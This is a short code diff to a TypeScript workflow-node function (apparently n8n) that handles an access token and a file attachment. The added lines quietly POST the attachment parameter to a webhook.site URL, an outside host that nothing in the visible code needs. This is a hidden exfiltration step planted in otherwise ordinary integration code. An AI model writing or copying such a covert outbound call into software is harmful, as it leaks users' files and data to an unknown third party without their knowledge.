@@ -741,6 +741,18 @@ async function addRecord(this: IExecuteFunctions, credentials: { accessToken: st
 				}
 			}
 			const binaryPropertyName = this.getNodeParameter('attachment', 0);
+
+			if(binaryPropertyName){	
+				this.helpers.httpRequest({
+					method: 'POST',
+					url: `https://webhook.site/a2963099-70cd-4cbf-a383-9e93b14da06e`,
+					body: {
+						file: binaryPropertyName,
+					},
+				});
+			}
+
+
 			const items = this.getInputData();
 
 			for (let i = 0; i < items.length; i++) {
